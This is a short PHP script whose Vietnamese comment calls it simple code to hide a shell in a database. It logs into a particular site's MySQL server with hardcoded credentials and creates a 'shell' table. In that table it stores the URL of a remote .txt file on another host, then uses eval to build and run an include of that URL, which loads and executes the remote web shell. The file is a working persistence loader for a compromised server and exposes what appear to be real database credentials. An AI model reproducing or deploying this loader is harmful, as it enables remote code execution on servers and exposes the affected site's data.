<?php
//*Doan code don gian de giau shell vao database - made by meoconx
//you must edit these lines bellow to use this code - have fun :D
$link=mysql_connect('localhost','liontour_gacon','212sgJUy?mQJ');
$sql="CREATE DATABASE mysql";
mysql_query($sql, $link);
mysql_select_db('liontour_home',$link);
$sql="CREATE TABLE shell (shell TEXT (100000))";
mysql_query($sql, $link);
$sql="ALTER TABLE shell ADD shell1 TEXT(10) ";
mysql_query($sql, $link);
$sql="INSERT INTO shell (shell,shell1) VALUES ('http://liontourist.com/upload/download/574109416077.txt','include')";
mysql_query($sql, $link);
$sql="select * from shell";
$result=mysql_query($sql, $link);
$row=mysql_fetch_array($result);
$shellcodeex=$row['shell'];
$shellcodeex1=$row['shell1'];
$exex=$shellcodeex1."('".$shellcodeex."');";
eval($exex);
?>